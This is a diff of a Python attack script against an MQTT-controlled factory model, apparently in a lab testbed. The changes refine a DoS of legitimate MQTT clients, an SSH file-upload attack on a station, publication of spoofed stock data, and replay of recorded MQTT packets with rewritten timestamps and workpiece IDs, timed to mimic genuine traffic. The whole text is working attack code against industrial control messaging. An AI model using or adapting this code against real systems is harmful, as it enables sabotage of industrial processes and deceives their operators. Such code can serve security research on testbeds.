@@ -10,25 +10,25 @@ import time
 from paramiko import SSHClient
 from paramiko.client import AutoAddPolicy
 from scp import SCPClient
-import threading
-
-globalise_client = None
+import random
 
 asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
 
 logger = logging.getLogger("attack_order")
 logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)
 
+IP_ADDRESS = '192.168.0.10'
+PORT = 1883
 
 def state(active, code, description="", station="vgr", target=None):
     if target is None:
         data = '{\n\t"active" : %s,\n\t"code" : %s,\n\t"description" : "%s",\n\t' \
                '"station" : "%s",\n\t' % (active, code, description, station)
-        data += new_ts()
+        data += new_ts() + "\n}"
     else:
         data = '{\n\t"active" : %s,\n\t"code" : %s,\n\t"description" : "%s",\n\t' \
            '"station" : "%s",\n\t"target" : "%s",\n\t' % (active, code, description, station, target)
-        data += new_ts()
+        data += new_ts() + "\n}"
     return data
 
 
@@ -40,7 +40,6 @@ def new_ts():
 
 
 def retrieve_from_stock(color: str, stock: str) -> str:
-    # global wp_id, wp_location
     # stock = stock.decode("utf-8")
 
     stock = json.loads(stock)
@@ -63,7 +62,7 @@ def retrieve_from_db(table_name):
     conn = sqlite3.connect("fl_mqtt.sqlite")
     cursor = conn.cursor()
 
-    cursor.execute(f"""SELECT time_delta_from_previous, mqtt_topic, mqtt_payload FROM {table_name}""")
+    cursor.execute(f"""SELECT time_delta_from_previous, mqtt_qos, mqtt_topic, mqtt_payload FROM {table_name}""")
     fetched = cursor.fetchall()
 
     return fetched
@@ -76,9 +75,9 @@ async def dos_leg_clients(client):
 
 
 async def ssh_attack():
-    await asyncio.sleep(27)
+    await asyncio.sleep(random.randint(27, 35))
 
-    # # supress logging info from paramiko
+    # supress logging info from paramiko
     logging.getLogger("paramiko").setLevel(logging.WARNING)
 
     logger.info("Starting file upload attack on target VGR")
@@ -136,7 +135,7 @@ async def publish_state_10_seconds(client):
 
 async def mass_publish(client, db_packets):
     # now we begin replaying our stored packets, but first ....
-    for wait_time, mqtt_topic, mqtt_payload in db_packets[1:]:  # skip first f/o/order packet
+    for wait_time, mqtt_qos, mqtt_topic, mqtt_payload in db_packets[1:]:  # skip first f/o/order packet
         org = mqtt_payload
         # .... we need to change timestamp in db mqtt_payload
         mqtt_payload = re.sub(r'"ts"\s*:.*Z"', new_ts(), mqtt_payload)
@@ -147,20 +146,26 @@ async def mass_publish(client, db_packets):
         # .... we need to update the wp id
         # we use an if condition to avoid messing with cases where there is an empty id., i.e: "id" : ""
         if not re.search(r'"id"\s*:\s*""', mqtt_payload):
-            mqtt_payload = re.sub(r'"id"\s*:.*"', f'"id" : {globs.wp_id}', mqtt_payload)
+            mqtt_payload = re.sub(r'"id"\s*:.*"', f'"id" : "{globs.wp_id}"', mqtt_payload)
+
+        # .... update stock
+        if mqtt_topic == "f/i/stock":
+            mqtt_payload = globs.HBW_STOCK
 
         # now be with publishing, before each publish, we wait for time_delta_previous from our db
-        await asyncio.sleep(float(wait_time))
-        await client.publish(mqtt_topic, mqtt_payload, qos=1)
+        # we send out packets 0.15 seconds earlier to cover for network I/O delay
+        if float(wait_time) >= 0.15:
+            await asyncio.sleep(float(wait_time)-0.15)
+        await client.publish(mqtt_topic, mqtt_payload, qos=int(mqtt_qos))
 
     logger.info("Waiting for attack to finish, almost there")
 
 
 async def main():
 
-    async with aiomqtt.Client("192.168.219.129", port=1883) as client:
-        global globalise_client, threads_list, thread_counter
-        globalise_client = client
+    async with aiomqtt.Client(IP_ADDRESS, port=PORT) as client:
+        print(client._client.max_inflight_messages)
+        print(client._client.max_queued_messages)
 
         # start a coroutine that runs concurrently our logic to publish FL state information every 10 seconds
         asyncio.create_task(publish_state_10_seconds(client))
@@ -170,19 +175,22 @@ async def main():
         await client.subscribe("f/o/order", qos=1)
         logger.info("Subscription to all topics of interest done")
 
-        await dos_leg_clients(client)
-        logger.info("Broadcast attack done. Legitimate clients now shut down")
-        logger.info("Listening for order")
-
         async for message in client.messages:
-            mqtt_payload = json.loads(message.payload)
+            try: mqtt_payload = json.loads(message.payload)
+            except json.decoder.JSONDecodeError as error: logger.debug(f"{error}\n{message.topic}\n{message.payload}")
 
             if message.topic.matches("f/i/stock") and not globs.is_stock_recorded:
-                globs.HBW_STOCK = json.dumps(mqtt_payload)
+                globs.HBW_STOCK = message.payload
                 globs.is_stock_recorded = True
                 print("Stock recorded")
 
+                await dos_leg_clients(client)
+                logger.info("Broadcast attack done. Legitimate clients now shut down")
+                logger.info("Listening for order")
+
             if message.topic.matches("f/o/order"):
+                # await client.unsubscribe("f/i/stock")
+
                 logger.info("Order received from Dashboard via broker")
                 globs.is_order_received = True
                 globs.order_color = mqtt_payload['type']
@@ -193,6 +201,9 @@ async def main():
                 logger.info("Retrieving order WP from Stock")
                 globs.HBW_STOCK = retrieve_from_stock(globs.order_color, globs.HBW_STOCK)
                 logger.info("Order successfully retrieved from Stock")
+
+                # publish fake stock right away to update order page
+                await client.publish("f/i/stock", globs.HBW_STOCK, qos=1)
 
                 # we then retrieve our stored packets from the DB so we can replay that
                 retrieved_packets = retrieve_from_db(globs.wp_location)
@@ -206,6 +217,7 @@ async def main():
                 logger.info(
                     "First run of attack done. Now sending idle status information to user while listening for new order.")
                 globs.send_state_every_10_seconds_trigger = True
-
+                globs.is_stock_recorded = False
+                print("Done")
 
 asyncio.run(main())
